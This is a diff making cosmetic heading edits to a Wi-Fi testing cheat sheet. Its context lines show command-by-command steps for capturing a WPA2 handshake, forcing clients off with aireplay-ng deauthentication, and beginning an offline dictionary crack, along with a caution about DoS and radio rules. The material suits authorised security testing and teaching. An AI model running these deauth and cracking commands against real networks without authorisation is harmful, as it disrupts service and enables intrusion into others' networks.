@@ -19,7 +19,7 @@ disruptive/DoS action and monitor-mode TX can violate radio regulations.
 
 ---
 
-## Step 1 — Interface prep
+## Step 1: Interface prep
 
 | Command | Action |
 |---------|--------|
@@ -32,7 +32,7 @@ disruptive/DoS action and monitor-mode TX can violate radio regulations.
 | `sudo iw dev wlan0mon set channel 6` | Pin channel manually |
 | `iw reg get` / `sudo iw reg set US` | Get/set regulatory domain |
 
-## Step 2 — Discovery (airodump-ng)
+## Step 2: Discovery (airodump-ng)
 
 | Command | Action |
 |---------|--------|
@@ -44,7 +44,7 @@ Read the display: **BSSID** (AP MAC), **CH** (channel), **ENC/CIPHER/AUTH**
 (WPA2 CCMP PSK), **ESSID** (name); lower rows show **STATION**s (clients) and
 which BSSID each is associated with.
 
-## Step 3 — Targeted capture
+## Step 3: Targeted capture
 
 ```bash
 sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon
@@ -59,7 +59,7 @@ sudo airodump-ng --bssid AA:BB:CC:11:22:33 -c 6 -w handshake wlan0mon
 | `-w <prefix>` | Output file prefix (`.cap`, `.csv`, ...) |
 | `--write-interval 1` | Flush file every second |
 
-## Step 4 — Deauthentication (aireplay-ng)
+## Step 4: Deauthentication (aireplay-ng)
 
 ```bash
 # Targeted (preferred): kick one client so it re-handshakes
@@ -76,13 +76,13 @@ sudo aireplay-ng --deauth 10 -a AA:BB:CC:11:22:33 wlan0mon
 | `-c <CLIENT>` | Target client (omit = broadcast) |
 | `--test` | Injection capability test |
 
-## Step 5 — Verify the handshake
+## Step 5: Verify the handshake
 
 ```bash
 sudo aircrack-ng handshake-01.cap        # look for "1 handshake" + your ESSID
 ```
 
-## Step 6 — Offline crack
+## Step 6: Offline crack
 
 ```bash
 # CPU dictionary attack with aircrack-ng
